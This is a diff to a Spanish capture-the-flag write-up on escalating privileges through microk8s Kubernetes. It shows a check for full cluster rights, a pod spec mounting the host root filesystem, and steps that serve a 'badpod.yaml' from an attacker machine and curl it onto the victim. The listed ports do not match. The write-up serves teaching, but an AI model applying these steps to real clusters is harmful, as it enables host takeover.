@@ -327,8 +327,6 @@ Por lo que ya hemos completado la fase de explotacion de la maquina hemos obteni
         frank@dev-01:/home/herby$ microk8s kubectl auth can-i '*' '*'
       yes
 
-    Por lo que podemos hacer y desacer a nuestro antojo.
-
   2)Obtenemos informacion namespace,nodo y pods
 
         frank@dev-01:/home/herby$ microk8s kubectl get namespace
@@ -383,6 +381,30 @@ Por lo que ya hemos completado la fase de explotacion de la maquina hemos obteni
           - name: noderoot
             hostPath:
               path: /
+
+  4)Subimos nuestro badpod.yaml a la maquina victima
+
+  Montamos con python un servidor http para compartir ficheros.
+  
+      ┌──(root㉿kali)-[/home/kali/Desktop/ctf/frankherby_app]
+      └─# python3 -m http.server 80
+        Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+  Desde la maquina victima nos descargamos el fichero a la carpeta /tmp
+
+      frank@dev-01:/home/herby$ curl http://10.10.209.46:31337/badpod.yaml -o /tmp/badpod.yaml
+      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                     Dload  Upload   Total   Spent    Left  Speed
+        100   153  100   153    0     0   5666      0 --:--:-- --:--:-- --:--:--  5666
+  
+      frank@dev-01:/home/herby$ cd /tmp; ls -la 
+      total 52
+      drwxrwxrwt 12 root  root  4096 Aug 13 16:37 .
+      drwxr-xr-x 21 root  root  4096 Oct 29  2021 ..
+      -rw-rw-r--  1 frank frank  153 Aug 13 16:37 badpod.yaml
+
+
+
 
       
 
